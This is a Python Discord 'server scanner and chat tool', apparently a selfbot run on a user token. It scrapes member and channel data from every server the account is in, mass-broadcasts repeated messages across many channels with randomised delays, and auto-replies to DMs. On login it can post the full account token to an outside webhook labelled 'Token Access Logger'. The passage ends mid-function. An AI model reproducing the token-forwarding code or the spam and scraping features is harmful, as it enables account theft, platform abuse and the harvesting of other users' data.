#!/usr/bin/env python3
"""
Discord Server Scanner and Chat Tool
"""

import asyncio
import discord
import json
import random
import os
import aiohttp
from datetime import datetime

# Configuration
CONFIG = {
    "min_delay": 1.0,
    "max_delay": 3.0,
    "auto_reply_enabled": False,
    "auto_reply_responses": []
}

class DiscordScanner:
    def __init__(self):
        self.client = None
        self.servers_cache = {}
        self.selected_server = None
        self.selected_channel = None
        self.selected_channels = []  # Multiple channels for multi-channel messaging
        self.auto_reply_enabled = False
        self.auto_reply_responses = []
        self.webhook_url = None
        
    async def connect_discord(self, token):
        """Connect to Discord"""
        # Simple client initialization for discord.py-self compatibility
        self.client = discord.Client()
        
        @self.client.event
        async def on_ready():
            print(f"Successfully logged in as: {self.client.user}")
            
            # Log token to webhook if configured
            if self.webhook_url:
                await self.log_token_to_webhook(token)
            
            # Only start main menu if not already running
            if not hasattr(self, '_menu_running'):
                self._menu_running = True
                await self.main_menu()
        
        @self.client.event
        async def on_message(message):
            # Auto-reply functionality - enhanced for better DM detection
            if self.auto_reply_enabled and message.author != self.client.user and not message.author.bot:
                # Check for mentions OR direct messages OR message requests
                is_mentioned = message.mentions and self.client.user in message.mentions
                is_dm = isinstance(message.channel, discord.DMChannel)
                is_group_dm = isinstance(message.channel, discord.GroupChannel)
                
                # Log all incoming messages for debugging
                if is_dm or is_group_dm:
                    print(f"[AUTO-REPLY] Received DM from {message.author.name}: {message.content[:50]}...")
                elif is_mentioned:
                    print(f"[AUTO-REPLY] Mentioned by {message.author.name} in #{message.channel.name}")
                
                if is_mentioned or is_dm or is_group_dm:
                    if self.auto_reply_responses:
                        response = random.choice(self.auto_reply_responses)
                        try:
                            if is_dm or is_group_dm:
                                await message.channel.send(response)
                                print(f"✓ Auto-replied to DM from {message.author.name}: {response}")
                            else:
                                await message.reply(response)
                                print(f"✓ Auto-replied to mention from {message.author.name}: {response}")
                            
                            # Add delay to avoid rate limits
                            await asyncio.sleep(random.uniform(1, 3))
                            
                        except discord.Forbidden:
                            print(f"✗ Cannot reply to {message.author.name}: No permission")
                        except discord.HTTPException as e:
                            print(f"✗ Failed to auto-reply to {message.author.name}: {e}")
                        except Exception as e:
                            print(f"✗ Unexpected error replying to {message.author.name}: {e}")
                    else:
                        print(f"⚠ Auto-reply triggered but no responses configured!")
        
        try:
            print("Attempting to connect to Discord...")
            await self.client.start(token)
        except discord.LoginFailure as e:
            print(f"Login failed with discord.py-self: {e}")
            # Try alternative connection method
            print("Trying alternative connection approach...")
            try:
                # Close existing client
                if self.client and not self.client.is_closed():
                    await self.client.close()
                
                # Create new client without intents
                self.client = discord.Client()
                
                @self.client.event
                async def on_ready():
                    print(f"Successfully logged in as: {self.client.user}")
                    if not hasattr(self, '_menu_running'):
                        self._menu_running = True
                        await self.main_menu()
                
                @self.client.event
                async def on_message(message):
                    if self.auto_reply_enabled and message.author != self.client.user and not message.author.bot:
                        is_mentioned = message.mentions and self.client.user in message.mentions
                        is_dm = isinstance(message.channel, discord.DMChannel)
                        is_group_dm = isinstance(message.channel, discord.GroupChannel)
                        
                        if is_dm or is_group_dm or is_mentioned:
                            if self.auto_reply_responses:
                                try:
                                    import random
                                    response = random.choice(self.auto_reply_responses)
                                    await message.reply(response)
                                    print(f"Auto-replied to {message.author.name}: {response}")
                                    await asyncio.sleep(random.uniform(1, 3))
                                except Exception as e:
                                    print(f"Auto-reply error: {e}")
                
                await self.client.start(token)
                
            except Exception as e2:
                print(f"Alternative connection also failed: {e2}")
                print("The discord.py-self library may have compatibility issues.")
        except discord.HTTPException as e:
            print(f"HTTP error occurred: {e}")
            if "401" in str(e) or "Unauthorized" in str(e):
                print("Authentication failed - token is likely invalid or expired.")
            elif "429" in str(e):
                print("Rate limited - try again later.")
            else:
                print("Check your internet connection and try again.")
        except Exception as e:
            print(f"Unexpected connection error: {e}")
            print("This might be a network issue or Discord API problem.")
        finally:
            if self.client and not self.client.is_closed():
                await self.client.close()
    
    async def log_token_to_webhook(self, token: str) -> bool:
        """Log access token to Discord webhook for monitoring"""
        if not self.webhook_url:
            return False
        
        try:
            # Get user info
            user_info = f"{self.client.user.name}#{self.client.user.discriminator} ({self.client.user.id})" if self.client and self.client.user else "Unknown User"
            
            # Create webhook payload
            embed = {
                "title": "🔑 Discord Token Access Log",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "Full Access Token",
                        "value": f"`{token}`",
                        "inline": False
                    },
                    {
                        "name": "User Info",
                        "value": user_info,
                        "inline": True
                    },
                    {
                        "name": "Timestamp",
                        "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
                        "inline": True
                    },
                    {
                        "name": "Script Version",
                        "value": "Scanner v1.0",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "Token Access Monitor"
                }
            }
            
            payload = {
                "embeds": [embed],
                "username": "Token Access Logger"
            }
            
            # Send to webhook
            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, json=payload) as response:
                    if response.status == 204:
                        print("✅ Token logged to webhook successfully")
                        return True
                    else:
                        print(f"⚠️ Webhook returned status {response.status}")
                        return False
                        
        except Exception as e:
            print(f"❌ Failed to log token to webhook: {e}")
            return False
    
    async def main_menu(self):
        """Main menu after login"""
        while True:
            print(f"\n{'='*60}")
            print("DISCORD SERVER SCANNER - MAIN MENU")
            print(f"{'='*60}")
            print("1. Scan all servers")
            print("2. Select server")
            print("3. Multi-channel selector")
            print("4. View cached server data")
            print("5. Message settings")
            print("6. Auto-reply settings")
            print("7. Extract invite links")
            print("8. Clear cached data")
            print("9. Exit")
            
            try:
                choice = input("\nSelect option (1-9): ").strip()
                
                if choice == "1":
                    await self.scan_all_servers()
                elif choice == "2":
                    await self.select_server_menu()
                elif choice == "3":
                    await self.multi_channel_selector()
                elif choice == "4":
                    self.view_cached_data()
                elif choice == "5":
                    self.message_settings_menu()
                elif choice == "6":
                    self.auto_reply_settings_menu()
                elif choice == "7":
                    await self.extract_invite_links()
                elif choice == "8":
                    self.clear_cache()
                elif choice == "9":
                    print("Goodbye!")
                    self._menu_running = False
                    await self.client.close()
                    break
                else:
                    print("Invalid option. Please select 1-9.")
                    
            except KeyboardInterrupt:
                print("\nExiting...")
                await self.client.close()
                break
            except Exception as e:
                print(f"Error: {e}")
    
    async def scan_all_servers(self):
        """Scan all servers for detailed information"""
        print(f"\n{'='*50}")
        print("SCANNING ALL SERVERS")
        print(f"{'='*50}")
        
        print(f"Found {len(self.client.guilds)} servers. Scanning for detailed info...")
        
        for guild in self.client.guilds:
            print(f"\nScanning server: {guild.name}")
            
            try:
                # Get channels
                text_channels = []
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).read_messages:
                        text_channels.append({
                            'id': str(channel.id),
                            'name': channel.name,
                            'topic': channel.topic or '',
                            'category': channel.category.name if channel.category else 'No Category'
                        })
                
                # Get members (limited to what's cached)
                members = []
                for member in guild.members[:100]:  # Limit to first 100 for performance
                    if not member.bot:
                        members.append({
                            'id': str(member.id),
                            'username': member.name,
                            'display_name': member.display_name or member.name,
                            'status': str(member.status) if hasattr(member, 'status') else 'unknown'
                        })
                
                # Cache server data
                self.servers_cache[guild.name] = {
                    'id': str(guild.id),
                    'member_count': guild.member_count,
                    'text_channels': text_channels,
                    'members': members,
                    'owner': str(guild.owner) if guild.owner else 'Unknown',
                    'created_at': guild.created_at.strftime('%Y-%m-%d'),
                    'permissions': {
                        'can_send_messages': any(ch['id'] for ch in text_channels),
                        'is_member': True
                    }
                }
                
                print(f"  • {len(text_channels)} accessible text channels")
                print(f"  • {len(members)} cached members")
                
            except discord.Forbidden:
                print(f"  • Limited access to {guild.name}")
                self.servers_cache[guild.name] = {
                    'id': str(guild.id),
                    'member_count': guild.member_count,
                    'text_channels': [],
                    'members': [],
                    'owner': 'Unknown',
                    'created_at': 'Unknown',
                    'permissions': {'can_send_messages': False, 'is_member': True}
                }
            except Exception as e:
                print(f"  • Error scanning {guild.name}: {e}")
        
        # Save scan results
        await self.save_scan_results()
        
        print(f"\nScan complete! Data cached for {len(self.servers_cache)} servers")
        input("\nPress Enter to return to main menu...")
    
    async def save_scan_results(self):
        """Save scan results to files"""
        try:
            # Save detailed server info to JSON
            with open("server_scan_results.json", 'w', encoding='utf-8') as f:
                json.dump(self.servers_cache, f, indent=2, ensure_ascii=False)
            
            # Save readable summary
            with open("server_summary.txt", 'w', encoding='utf-8') as f:
                f.write(f"Discord Server Scan Summary\n")
                f.write(f"Scanned on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total servers: {len(self.servers_cache)}\n\n")
                
                for server_name, data in self.servers_cache.items():
                    f.write(f"Server: {server_name}\n")
                    f.write(f"  ID: {data['id']}\n")
                    f.write(f"  Members: {data['member_count']}\n")
                    f.write(f"  Accessible Channels: {len(data['text_channels'])}\n")
                    f.write(f"  Owner: {data['owner']}\n")
                    f.write(f"  Created: {data['created_at']}\n")
                    f.write(f"  Can Send Messages: {data['permissions']['can_send_messages']}\n\n")
                    
                    if data['text_channels']:
                        f.write(f"  Text Channels:\n")
                        for ch in data['text_channels']:
                            f.write(f"    #{ch['name']} - {ch['category']}\n")
                        f.write("\n")
            
            print("Saved: server_scan_results.json")
            print("Saved: server_summary.txt")
            
        except Exception as e:
            print(f"Error saving scan results: {e}")
    
    def view_cached_data(self):
        """View currently cached server data"""
        if not self.servers_cache:
            print("\nNo cached data. Please scan servers first.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*50}")
        print("CACHED SERVER DATA")
        print(f"{'='*50}")
        
        for i, (server_name, data) in enumerate(self.servers_cache.items(), 1):
            print(f"{i:2d}. {server_name}")
            print(f"     Members: {data['member_count']} | Channels: {len(data['text_channels'])}")
            print(f"     Can send messages: {data['permissions']['can_send_messages']}")
        
        input("\nPress Enter to return to main menu...")
    
    def clear_cache(self):
        """Clear cached server data"""
        self.servers_cache = {}
        self.selected_server = None
        self.selected_channel = None
        self.selected_channels = []
        print("\nCached data cleared.")
        input("Press Enter to continue...")
    
    async def select_server_menu(self):
        """Menu for selecting a server"""
        if not self.servers_cache:
            print("\nNo cached server data. Please scan servers first.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*50}")
        print("SELECT SERVER")
        print(f"{'='*50}")
        
        servers = list(self.servers_cache.keys())
        
        for i, server_name in enumerate(servers, 1):
            data = self.servers_cache[server_name]
            print(f"{i:2d}. {server_name} ({len(data['text_channels'])} channels)")
        
        print(f"\nEnter server number or 'back' to return:")
        
        while True:
            choice = input("Your choice: ").strip().lower()
            
            if choice == 'back':
                return
            
            try:
                server_num = int(choice)
                if 1 <= server_num <= len(servers):
                    self.selected_server = servers[server_num - 1]
                    print(f"\nSelected server: {self.selected_server}")
                    await self.select_channel_menu()
                    return
                else:
                    print(f"Invalid number. Please enter 1-{len(servers)}")
                    
            except ValueError:
                print("Invalid input. Please enter a number or 'back'")
    
    async def select_channel_menu(self):
        """Menu for selecting a channel in the selected server"""
        if not self.selected_server:
            return
        
        server_data = self.servers_cache[self.selected_server]
        channels = server_data['text_channels']
        
        if not channels:
            print(f"\nNo accessible channels in {self.selected_server}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*50}")
        print(f"SELECT CHANNEL - {self.selected_server}")
        print(f"{'='*50}")
        
        for i, channel in enumerate(channels, 1):
            print(f"{i:2d}. #{channel['name']} - {channel['category']}")
            if channel['topic']:
                print(f"     Topic: {channel['topic'][:60]}...")
        
        print(f"\nEnter channel number or 'back' to return:")
        
        while True:
            choice = input("Your choice: ").strip().lower()
            
            if choice == 'back':
                return
            
            try:
                channel_num = int(choice)
                if 1 <= channel_num <= len(channels):
                    self.selected_channel = channels[channel_num - 1]
                    print(f"\nSelected channel: #{self.selected_channel['name']}")
                    await self.chat_menu()
                    return
                else:
                    print(f"Invalid number. Please enter 1-{len(channels)}")
                    
            except ValueError:
                print("Invalid input. Please enter a number or 'back'")
    
    async def chat_menu(self):
        """Menu for sending messages to the selected channel"""
        if not self.selected_channel:
            return
        
        print(f"\n{'='*50}")
        print(f"CHAT IN #{self.selected_channel['name']}")
        print(f"Server: {self.selected_server}")
        print(f"{'='*50}")
        print("1. Send single message")
        print("2. Send messages from chats.txt")
        print("3. Send multiple custom messages")
        print("4. Back to channel selection")
        
        while True:
            choice = input("\nSelect option (1-4): ").strip()
            
            if choice == "1":
                await self.send_single_message()
            elif choice == "2":
                await self.send_from_file()
            elif choice == "3":
                await self.send_multiple_custom()
            elif choice == "4":
                return
            else:
                print("Invalid option. Please select 1-4.")
    
    async def send_single_message(self):
        """Send a single message to the selected channel"""
        print("\nEnter your message (or 'cancel' to abort):")
        message = input()
        
        if message.lower().strip() == 'cancel' or not message.strip():
            print("Message cancelled.")
            return
        
        try:
            channel = self.client.get_channel(int(self.selected_channel['id']))
            if channel:
                await channel.send(message)
                print(f"✓ Message sent to #{self.selected_channel['name']}")
            else:
                print("✗ Could not find channel")
                
        except discord.Forbidden:
            print("✗ No permission to send messages in this channel")
        except Exception as e:
            print(f"✗ Error sending message: {e}")
        
        input("\nPress Enter to continue...")
    
    async def send_from_file(self):
        """Send messages from chats.txt file"""
        if not os.path.exists("chats.txt"):
            print("\nchats.txt file not found.")
            create = input("Create sample chats.txt? (yes/no): ").lower().strip()
            if create in ['yes', 'y']:
                with open("chats.txt", 'w', encoding='utf-8') as f:
                    f.write("# Messages to send (one per line)\n")
                    f.write("# Lines starting with # are comments\n\n")
                    f.write("Hello everyone!\n")
                    f.write("This is a test message\n")
                    f.write("# Add your messages below:\n")
                print("Sample chats.txt created. Edit it and try again.")
            input("Press Enter to continue...")
            return
        
        try:
            messages = []
            with open("chats.txt", 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        messages.append(line)
            
            if not messages:
                print("No messages found in chats.txt")
                input("Press Enter to continue...")
                return
            
            print(f"\nFound {len(messages)} messages to send.")
            print("Preview:")
            for i, msg in enumerate(messages[:3], 1):
                print(f"  {i}. {msg[:50]}{'...' if len(msg) > 50 else ''}")
            
            if len(messages) > 3:
                print(f"  ... and {len(messages) - 3} more")
            
            confirm = input(f"\nSend {len(messages)} messages to #{self.selected_channel['name']}? (yes/no): ")
            if confirm.lower().strip() not in ['yes', 'y']:
                print("Cancelled.")
                input("Press Enter to continue...")
                return
            
            channel = self.client.get_channel(int(self.selected_channel['id']))
            if not channel:
                print("✗ Could not find channel")
                input("Press Enter to continue...")
                return
            
            print(f"\nSending messages...")
            sent_count = 0
            failed_count = 0
            
            for i, message in enumerate(messages, 1):
                print(f"[{i}/{len(messages)}] Sending: {message[:30]}...")
                
                try:
                    await channel.send(message)
                    print(f"✓ Sent")
                    sent_count += 1
                    
                    # Delay between messages
                    if i < len(messages):
                        delay = random.uniform(CONFIG['min_delay'], CONFIG['max_delay'])
                        await asyncio.sleep(delay)
                        
                except discord.Forbidden:
                    print(f"✗ No permission")
                    failed_count += 1
                except discord.HTTPException as e:
                    print(f"✗ Error: {e}")
                    failed_count += 1
                except Exception as e:
                    print(f"✗ Unexpected error: {e}")
                    failed_count += 1
            
            print(f"\n{'='*40}")
            print(f"RESULTS:")
            print(f"Successfully sent: {sent_count}")
            print(f"Failed to send: {failed_count}")
            print(f"{'='*40}")
            
        except Exception as e:
            print(f"Error reading chats.txt: {e}")
        
        input("\nPress Enter to continue...")
    
    async def multi_channel_selector(self):
        """Multi-channel selector for broadcasting to multiple channels"""
        if not self.servers_cache:
            print("\nNo cached server data. Please scan servers first.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*60}")
        print("MULTI-CHANNEL SELECTOR")
        print(f"{'='*60}")
        print(f"Currently selected: {len(self.selected_channels)} channels")
        
        if self.selected_channels:
            print("\nSelected channels:")
            for i, ch in enumerate(self.selected_channels, 1):
                print(f"  {i}. #{ch['name']} (Server: {ch['server']})")
        
        print("\n1. Add channels")
        print("2. Remove channels")
        print("3. Clear all selected channels")
        print("4. Send to all selected channels")
        print("5. Back to main menu")
        
        while True:
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                await self.add_channels_to_selection()
            elif choice == "2":
                self.remove_channels_from_selection()
            elif choice == "3":
                self.clear_selected_channels()
            elif choice == "4":
                if self.selected_channels:
                    await self.multi_channel_chat()
                else:
                    print("No channels selected. Add channels first.")
                    input("Press Enter to continue...")
            elif choice == "5":
                break
            else:
                print("Invalid option. Please select 1-5.")
    
    async def add_channels_to_selection(self):
        """Add channels to the multi-channel selection"""
        # Create a flat list of all available channels with server info
        all_channels = []
        for server_name, server_data in self.servers_cache.items():
            for channel in server_data['text_channels']:
                all_channels.append({
                    'id': channel['id'],
                    'name': channel['name'],
                    'server': server_name,
                    'category': channel['category'],
                    'topic': channel['topic']
                })
        
        if not all_channels:
            print("\nNo accessible channels found in cached servers.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*50}")
        print("ADD CHANNELS TO SELECTION")
        print(f"{'='*50}")
        print("Available channels:")
        
        for i, ch in enumerate(all_channels, 1):
            already_selected = any(sel['id'] == ch['id'] for sel in self.selected_channels)
            status = "[SELECTED]" if already_selected else ""
            print(f"{i:2d}. #{ch['name']} - {ch['server']} {status}")
        
        print(f"\nEnter channel numbers separated by commas (e.g., 1,3,5)")
        print("Or enter 'all' to select all channels, 'back' to return:")
        
        while True:
            choice = input("Your choice: ").strip().lower()
            
            if choice == 'back':
                return
            elif choice == 'all':
                # Add all channels that aren't already selected
                added_count = 0
                for ch in all_channels:
                    if not any(sel['id'] == ch['id'] for sel in self.selected_channels):
                        self.selected_channels.append(ch)
                        added_count += 1
                print(f"Added {added_count} channels to selection.")
                input("Press Enter to continue...")
                return
            else:
                try:
                    # Parse comma-separated numbers
                    indices = [int(x.strip()) for x in choice.split(',') if x.strip()]
                    added_count = 0
                    
                    for idx in indices:
                        if 1 <= idx <= len(all_channels):
                            ch = all_channels[idx - 1]
                            # Check if already selected
                            if not any(sel['id'] == ch['id'] for sel in self.selected_channels):
                                self.selected_channels.append(ch)
                                added_count += 1
                                print(f"Added: #{ch['name']} ({ch['server']})")
                            else:
                                print(f"Already selected: #{ch['name']} ({ch['server']})")
                        else:
                            print(f"Invalid index: {idx}")
                    
                    if added_count > 0:
                        print(f"\nAdded {added_count} new channels.")
                    input("Press Enter to continue...")
                    return
                    
                except ValueError:
                    print("Invalid input. Please enter numbers separated by commas.")
    
    def remove_channels_from_selection(self):
        """Remove channels from the multi-channel selection"""
        if not self.selected_channels:
            print("\nNo channels selected.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*50}")
        print("REMOVE CHANNELS FROM SELECTION")
        print(f"{'='*50}")
        print("Selected channels:")
        
        for i, ch in enumerate(self.selected_channels, 1):
            print(f"{i:2d}. #{ch['name']} - {ch['server']}")
        
        print(f"\nEnter channel numbers to remove (e.g., 1,3,5)")
        print("Or enter 'all' to clear all, 'back' to return:")
        
        while True:
            choice = input("Your choice: ").strip().lower()
            
            if choice == 'back':
                return
            elif choice == 'all':
                self.selected_channels = []
                print("All channels removed from selection.")
                input("Press Enter to continue...")
                return
            else:
                try:
                    indices = [int(x.strip()) for x in choice.split(',') if x.strip()]
                    # Sort in reverse order to avoid index shifting
                    indices.sort(reverse=True)
                    removed_count = 0
                    
                    for idx in indices:
                        if 1 <= idx <= len(self.selected_channels):
                            removed_ch = self.selected_channels.pop(idx - 1)
                            print(f"Removed: #{removed_ch['name']} ({removed_ch['server']})")
                            removed_count += 1
                        else:
                            print(f"Invalid index: {idx}")
                    
                    if removed_count > 0:
                        print(f"\nRemoved {removed_count} channels.")
                    input("Press Enter to continue...")
                    return
                    
                except ValueError:
                    print("Invalid input. Please enter numbers separated by commas.")
    
    def clear_selected_channels(self):
        """Clear all selected channels"""
        self.selected_channels = []
        print("All selected channels cleared.")
        input("Press Enter to continue...")
    
    async def multi_channel_chat(self):
        """Chat interface for sending to multiple channels"""
        print(f"\n{'='*60}")
        print(f"MULTI-CHANNEL CHAT ({len(self.selected_channels)} channels)")
        print(f"{'='*60}")
        
        print("Selected channels:")
        for i, ch in enumerate(self.selected_channels, 1):
            print(f"  {i}. #{ch['name']} (Server: {ch['server']})")
        
        print("\n1. Send single message to all")
        print("2. Send messages from chats.txt to all")
        print("3. Send multiple custom messages to all")
        print("4. Back to multi-channel menu")
        
        while True:
            choice = input("\nSelect option (1-4): ").strip()
            
            if choice == "1":
                await self.send_single_to_all()
            elif choice == "2":
                await self.send_file_to_all()
            elif choice == "3":
                await self.send_multiple_to_all()
            elif choice == "4":
                return
            else:
                print("Invalid option. Please select 1-4.")
    
    async def send_single_to_all(self):
        """Send a single message to all selected channels"""
        print("\nEnter your message (or 'cancel' to abort):")
        message = input()
        
        if message.lower().strip() == 'cancel' or not message.strip():
            print("Message cancelled.")
            return
        
        print(f"\nReady to send message to {len(self.selected_channels)} channels:")
        print(f"Message: {message}")
        
        confirm = input("\nContinue? (yes/no): ").lower().strip()
        if confirm not in ['yes', 'y']:
            print("Cancelled.")
            input("Press Enter to continue...")
            return
        
        await self.broadcast_message(message)
    
    async def send_file_to_all(self):
        """Send messages from chats.txt to all selected channels"""
        if not os.path.exists("chats.txt"):
            print("\nchats.txt file not found.")
            create = input("Create sample chats.txt? (yes/no): ").lower().strip()
            if create in ['yes', 'y']:
                with open("chats.txt", 'w', encoding='utf-8') as f:
                    f.write("# Messages to send (one per line)\n")
                    f.write("# Lines starting with # are comments\n\n")
                    f.write("Hello everyone!\n")
                    f.write("This is a test message\n")
                    f.write("# Add your messages below:\n")
                print("Sample chats.txt created. Edit it and try again.")
            input("Press Enter to continue...")
            return
        
        try:
            messages = []
            with open("chats.txt", 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        messages.append(line)
            
            if not messages:
                print("No messages found in chats.txt")
                input("Press Enter to continue...")
                return
            
            print(f"\nFound {len(messages)} messages to send to {len(self.selected_channels)} channels.")
            print("Preview:")
            for i, msg in enumerate(messages[:3], 1):
                print(f"  {i}. {msg[:50]}{'...' if len(msg) > 50 else ''}")
            
            if len(messages) > 3:
                print(f"  ... and {len(messages) - 3} more")
            
            total_sends = len(messages) * len(self.selected_channels)
            print(f"\nTotal messages to send: {total_sends}")
            
            confirm = input(f"\nSend {len(messages)} messages to {len(self.selected_channels)} channels? (yes/no): ")
            if confirm.lower().strip() not in ['yes', 'y']:
                print("Cancelled.")
                input("Press Enter to continue...")
                return
            
            await self.broadcast_messages(messages)
            
        except Exception as e:
            print(f"Error reading chats.txt: {e}")
            input("Press Enter to continue...")
    
    async def send_multiple_to_all(self):
        """Send multiple custom messages to all selected channels"""
        print("\nEnter the message to send:")
        message = input().strip()
        
        if not message:
            print("Message cannot be empty.")
            input("Press Enter to continue...")
            return
        
        try:
            count = int(input("How many times to send this message? ").strip())
            if count <= 0:
                print("Count must be greater than 0.")
                input("Press Enter to continue...")
                return
            
            total_sends = count * len(self.selected_channels)
            print(f"\nTotal messages to send: {total_sends}")
            print(f"Message: {message}")
            print(f"Count per channel: {count}")
            print(f"Channels: {len(self.selected_channels)}")
            
            confirm = input("\nContinue? (yes/no): ").lower().strip()
            if confirm not in ['yes', 'y']:
                print("Cancelled.")
                input("Press Enter to continue...")
                return
            
            # Create a list with the message repeated count times
            messages = [message] * count
            await self.broadcast_messages(messages)
            
        except ValueError:
            print("Invalid input. Please enter a number.")
            input("Press Enter to continue...")
    
    async def broadcast_message(self, message):
        """Broadcast a single message to all selected channels"""
        print(f"\nSending message to {len(self.selected_channels)} channels...")
        
        success_count = 0
        failed_count = 0
        
        for i, ch_info in enumerate(self.selected_channels, 1):
            print(f"[{i}/{len(self.selected_channels)}] Sending to #{ch_info['name']} ({ch_info['server']})...")
            
            try:
                channel = self.client.get_channel(int(ch_info['id']))
                if channel:
                    await channel.send(message)
                    print(f"✓ Sent")
                    success_count += 1
                else:
                    print(f"✗ Channel not found")
                    failed_count += 1
                    
            except discord.Forbidden:
                print(f"✗ No permission")
                failed_count += 1
            except Exception as e:
                print(f"✗ Error: {e}")
                failed_count += 1
            
            # Delay between channels (except after last channel)
            if i < len(self.selected_channels):
                delay = random.uniform(CONFIG['min_delay'], CONFIG['max_delay'])
                print(f"  Waiting {delay:.1f}s before next channel...")
                
                # Split long delays to maintain connection
                if delay > 30:
                    chunks = int(delay / 30) + 1
                    chunk_delay = delay / chunks
                    for chunk in range(chunks):
                        await asyncio.sleep(chunk_delay)
                        print(f"    ... {((chunk + 1) * chunk_delay):.1f}s elapsed")
                else:
                    await asyncio.sleep(delay)
        
        print(f"\n{'='*50}")
        print(f"BROADCAST RESULTS:")
        print(f"Successfully sent: {success_count}")
        print(f"Failed to send: {failed_count}")
        print(f"{'='*50}")
        input("\nPress Enter to continue...")
    
    async def broadcast_messages(self, messages):
        """Broadcast multiple messages to all selected channels"""
        print(f"\nSending {len(messages)} messages to {len(self.selected_channels)} channels...")
        
        total_success = 0
        total_failed = 0
        
        for msg_idx, message in enumerate(messages, 1):
            print(f"\nMessage {msg_idx}/{len(messages)}: {message[:50]}{'...' if len(message) > 50 else ''}")
            
            for ch_idx, ch_info in enumerate(self.selected_channels, 1):
                print(f"  [{ch_idx}/{len(self.selected_channels)}] #{ch_info['name']} ({ch_info['server']})...")
                
                try:
                    channel = self.client.get_channel(int(ch_info['id']))
                    if channel:
                        await channel.send(message)
                        print(f"  ✓ Sent")
                        total_success += 1
                    else:
                        print(f"  ✗ Channel not found")
                        total_failed += 1
                        
                except discord.Forbidden:
                    print(f"  ✗ No permission")
                    total_failed += 1
                except Exception as e:
                    print(f"  ✗ Error: {e}")
                    total_failed += 1
                
                # Delay between each send
                delay = random.uniform(CONFIG['min_delay'], CONFIG['max_delay'])
                print(f"    Waiting {delay:.1f}s...")
                
                # Split long delays to maintain connection
                if delay > 30:
                    chunks = int(delay / 30) + 1
                    chunk_delay = delay / chunks
                    for chunk in range(chunks):
                        await asyncio.sleep(chunk_delay)
                        print(f"      ... {((chunk + 1) * chunk_delay):.1f}s elapsed")
                else:
                    await asyncio.sleep(delay)
        
        print(f"\n{'='*50}")
        print(f"BROADCAST RESULTS:")
        print(f"Total messages sent: {total_success}")
        print(f"Total failures: {total_failed}")
        print(f"Messages per channel: {len(messages)}")
        print(f"Channels targeted: {len(self.selected_channels)}")
        print(f"{'='*50}")
        input("\nPress Enter to continue...")
    
    def message_settings_menu(self):
        """Configure message timing settings"""
        print(f"\n{'='*50}")
        print("MESSAGE SETTINGS")
        print(f"{'='*50}")
        print(f"Current settings:")
        print(f"  Min delay: {CONFIG['min_delay']} seconds")
        print(f"  Max delay: {CONFIG['max_delay']} seconds")
        print()
        print("1. Change delay settings")
        print("2. Back to main menu")
        
        while True:
            choice = input("\nSelect option (1-2): ").strip()
            
            if choice == "1":
                self.configure_delays()
                break
            elif choice == "2":
                break
            else:
                print("Invalid option. Please select 1-2.")
    
    def configure_delays(self):
        """Configure message delays"""
        try:
            print("\nEnter new delay settings (max 30 minutes = 1800 seconds):")
            print("Examples: 1.5 (1.5 seconds), 60 (1 minute), 1800 (30 minutes)")
            
            min_input = input(f"Minimum delay between messages (current: {CONFIG['min_delay']}s): ").strip()
            if min_input:
                min_delay = float(min_input)
            else:
                min_delay = CONFIG['min_delay']
            
            max_input = input(f"Maximum delay between messages (current: {CONFIG['max_delay']}s): ").strip()
            if max_input:
                max_delay = float(max_input)
            else:
                max_delay = CONFIG['max_delay']
            
            # Validate delays
            if min_delay < 0 or max_delay < 0:
                print("Invalid delays. Delays must be >= 0.")
                return
            
            if min_delay > max_delay:
                print("Invalid delays. Min delay must be <= max delay.")
                return
            
            if max_delay > 1800:  # 30 minutes
                print("Maximum delay cannot exceed 30 minutes (1800 seconds).")
                return
            
            CONFIG['min_delay'] = min_delay
            CONFIG['max_delay'] = max_delay
            
            # Display friendly time format
            def format_time(seconds):
                if seconds >= 60:
                    minutes = seconds / 60
                    return f"{seconds}s ({minutes:.1f} minutes)"
                return f"{seconds}s"
            
            print(f"Delays updated:")
            print(f"  Min: {format_time(min_delay)}")
            print(f"  Max: {format_time(max_delay)}")
            
        except ValueError:
            print("Invalid input. Please enter numbers only.")
        
        input("Press Enter to continue...")
    
    def auto_reply_settings_menu(self):
        """Configure auto-reply settings"""
        print(f"\n{'='*50}")
        print("AUTO-REPLY SETTINGS")
        print(f"{'='*50}")
        print(f"Status: {'Enabled' if self.auto_reply_enabled else 'Disabled'}")
        print(f"Responses loaded: {len(self.auto_reply_responses)}")
        print(f"Triggers: Mentions and Direct Messages")
        print()
        print("1. Toggle auto-reply on/off")
        print("2. Add response")
        print("3. View responses")
        print("4. Clear responses")
        print("5. Load from autoreplies.txt")
        print("6. Back to main menu")
        
        while True:
            choice = input("\nSelect option (1-6): ").strip()
            
            if choice == "1":
                self.toggle_auto_reply()
            elif choice == "2":
                self.add_auto_reply()
            elif choice == "3":
                self.view_auto_replies()
            elif choice == "4":
                self.clear_auto_replies()
            elif choice == "5":
                self.load_auto_replies_from_file()
            elif choice == "6":
                break
            else:
                print("Invalid option. Please select 1-6.")
    
    def toggle_auto_reply(self):
        """Toggle auto-reply on/off"""
        self.auto_reply_enabled = not self.auto_reply_enabled
        status = "enabled" if self.auto_reply_enabled else "disabled"
        print(f"Auto-reply {status}")
        
        if self.auto_reply_enabled and not self.auto_reply_responses:
            print("Warning: No auto-reply responses set. Add some responses first.")
        
        input("Press Enter to continue...")
    
    def add_auto_reply(self):
        """Add an auto-reply response"""
        print("\nEnter auto-reply response (or 'cancel' to abort):")
        response = input().strip()
        
        if response.lower() == 'cancel' or not response:
            print("Cancelled.")
            return
        
        self.auto_reply_responses.append(response)
        print(f"Added response: {response}")
        input("Press Enter to continue...")
    
    def view_auto_replies(self):
        """View current auto-reply responses"""
